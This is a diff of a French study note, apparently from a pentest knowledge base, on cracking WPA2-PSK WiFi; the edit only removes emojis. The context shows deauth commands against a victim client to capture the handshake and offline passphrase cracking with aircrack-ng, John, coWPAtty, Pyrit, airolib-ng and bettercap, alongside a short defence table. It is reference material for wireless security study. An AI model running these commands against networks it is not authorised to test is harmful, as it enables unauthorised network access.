@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🔐 Attaques WiFi — WPA2-PSK
+# Attaques WiFi — WPA2-PSK
 
 > [!info] **En 1 phrase**
 > Le WPA2-PSK se casse en **capturant le handshake 4-way** (via deauth d'un client) puis en **cracker la passphrase
@@ -21,7 +21,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -32,13 +32,13 @@ flowchart LR
     E --> F[Passphrase]
 ```
 
-> [!info] 💡 **Pourquoi « hors-ligne » ?**
+> [!info] **Pourquoi « hors-ligne » ?**
 > Le handshake contient tout ce qu'il faut pour vérifier une passphrase : on ne touche plus le réseau.
 > PBKDF2-HMAC-SHA1 (4096 itérations) rend chaque tentative **lente** → cibler la wordlist.
 
 ---
 
-## 🎯 Capture du handshake 4-way
+## Capture du handshake 4-way
 
 ```bash
 airmon-ng start wlan0 3
@@ -49,12 +49,12 @@ aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
 #  > Vérifier "WPA handshake" en haut à droite de airodump-ng
 ```
 
-> [!warning] ⚠️ **Piège** : un handshake partiel ne suffit pas.
+> [!warning] **Piège** : un handshake partiel ne suffit pas.
 > Attendre d'avoir les **4 messages EAPOL** (`tshark -r cap.cap -Y "eapol"`).
 
 ---
 
-## 💥 Crack avec aircrack-ng
+## Crack avec aircrack-ng
 
 ```bash
 # Simple
@@ -69,7 +69,7 @@ aircrack-ng -w pass1.txt,pass2.txt wpajohn-01.cap
 
 ---
 
-## 🔗 Crack avec John the Ripper (mangling)
+## Crack avec John the Ripper (mangling)
 
 ```bash
 # Règles de mangling (ajouter dans john.conf) :
@@ -88,7 +88,7 @@ john <JohnOutFile>
 
 ---
 
-## 🌈 Crack avec coWPAtty (rainbow PMK)
+## Crack avec coWPAtty (rainbow PMK)
 
 > Meilleur pour les **rainbow tables** de PMK (précalcul).
 
@@ -107,7 +107,7 @@ cowpatty -r wpacow-01.cap -d wifuhashes -2 -s $AP_SSID
 
 ---
 
-## 🖥️ Crack avec Pyrit (GPU / DB de PMK)
+## Crack avec Pyrit (GPU / DB de PMK)
 
 ```bash
 airmon-ng start wlan0 3
@@ -138,7 +138,7 @@ pyrit -r wpastripped.cap attack_db
 
 ---
 
-## 🗄️ airolib-ng : base de PMK pour cracks futurs
+## airolib-ng : base de PMK pour cracks futurs
 
 ```bash
 # Importer l'ESSID + la wordlist → précalculer les PMK
@@ -156,11 +156,11 @@ aircrack-ng -r test.db wpajohn-01.cap
 # airolib-ng test.db --clean all
 ```
 
-> 💡 Une fois les PMK précalculés pour un ESSID, tous les futurs handshakes de **cet ESSID** se crackent instantanément.
+> Une fois les PMK précalculés pour un ESSID, tous les futurs handshakes de **cet ESSID** se crackent instantanément.
 
 ---
 
-## 🤖 Crack avec bettercap
+## Crack avec bettercap
 
 ```bash
 # Installation
@@ -187,7 +187,7 @@ sudo bettercap -iface wlan0
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -196,7 +196,7 @@ sudo bettercap -iface wlan0
 | **802.1X / Enterprise** | Remplace le PSK partagé par une authentification par utilisateur |
 | **WIDS** | Détecte les deauth répétées (signature de collecte d'handshake) |
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
 - Le crack est **lent** (PBKDF2) : pas de brute-force massif → **wordlist ciblée / masque intelligent**.
 - **Précalculer les PMK** (airolib-ng, pyrit batch) accélère les cracks suivants du même ESSID.
@@ -204,7 +204,7 @@ sudo bettercap -iface wlan0
 - **WPA2 + PMKID** : l'AP peut fournir le PMKID sans client → voir la fiche PMKID.
 - Le format **hccapx** (`-m 2500`) est l'ancien ; préférer le **22000** (`hcxpcapngtool -o hash.22000`).
 
-> [!info] 📚 **Sources**
+> [!info] **Sources**
 > GitHub : [swisskyrepo/HardwareAllTheThings – `docs/protocols/wifi/wifi-wpa.md`](https://github.com/swisskyrepo/HardwareAllTheThings/blob/main/docs/protocols/wifi/wifi-wpa.md)
 
-➡️ **Liens :** [[Attaques WiFi (WPA2 et PMKID)|📶 Hub WiFi]] · [[Attaques WiFi - Préparation & Basiques|🧰 Préparation]] · [[Attaques WiFi - PMKID|📶 PMKID]] · [[Attaques WiFi - WPS|🔢 WPS]] · [[Password Cracking|🔐 Cracking]] · [[Bibliothèque technique|🏠 Index]]
+**Liens :** [[Attaques WiFi (WPA2 et PMKID)| Hub WiFi]] · [[Attaques WiFi - Préparation & Basiques| Préparation]] · [[Attaques WiFi - PMKID| PMKID]] · [[Attaques WiFi - WPS| WPS]] · [[Password Cracking| Cracking]] · [[Bibliothèque technique| Index]]
